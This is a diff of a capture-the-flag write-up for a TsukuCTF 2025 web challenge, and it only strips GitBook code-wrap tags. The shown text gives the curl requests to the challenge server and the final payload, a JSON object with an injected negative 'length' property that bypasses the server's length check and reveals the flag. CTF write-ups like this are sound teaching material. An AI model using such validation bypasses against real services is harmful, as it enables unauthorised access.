@@ -30,39 +30,32 @@ layout:
 
 The challenge description suggests we run a curl command.
 
-{% code overflow="wrap" %}
 ```bash
 curl http://challs.tsukuctf.org:28888
 
 How to use -> curl -X POST -d 'array=[1,2,3,4]' http://challs.tsukuctf.org:28888
 ```
-{% endcode %}
 
 Now we have a new curl command to try.
 
-{% code overflow="wrap" %}
 ```bash
 curl -X POST -d 'array=[1,2,3,4]' http://challs.tsukuctf.org:28888
 
 error: no flag for you. sanitized string is [1,2,3,4], length is 9
 ```
-{% endcode %}
 
 Wait, do we just make the numbers add up to 6?
 
-{% code overflow="wrap" %}
 ```bash
 curl -X POST -d 'array=[1,2,3,0]' http://challs.tsukuctf.org:28888
 
 error: no flag for you. sanitized string is [1,2,3,0], length is 9
 ```
-{% endcode %}
 
 I guess not. Let's check the source code 🔎
 
 ### Source code
 
-{% code overflow="wrap" %}
 ```js
 const express = require("express");
 const bodyParser = require("body-parser");
@@ -101,7 +94,6 @@ app.listen(PORT, () => {
     console.log(`Server is running on http://${HOST}:${PORT}`);
 });
 ```
-{% endcode %}
 
 ### Breaking it down
 
@@ -114,23 +106,19 @@ app.listen(PORT, () => {
 
 We can easily get around the first check by increasing the array (string) length, but we fail the second test.
 
-{% code overflow="wrap" %}
 ```bash
 curl -X POST -d 'array=[1,2,3,4,5]' http://challs.tsukuctf.org:28888
 
 error: no flag for you. array length is too long -> 5
 ```
-{% endcode %}
 
 The trick here is to enter a string that is 10+ characters, but that when parsed as JSON will return a length less than 0. Since `array` is a JSON object and the code checks the `length` property of that object, why don't we try injecting a `length` property ourselves?
 
-{% code overflow="wrap" %}
 ```bash
 curl -X POST -d 'array={"length": -420}' http://challs.tsukuctf.org:28888
 
 TsukuCTF25{l4n_l1n_lun_l4n_l0n}
 ```
-{% endcode %}
 
 It works, we get the flag! 🚩
 
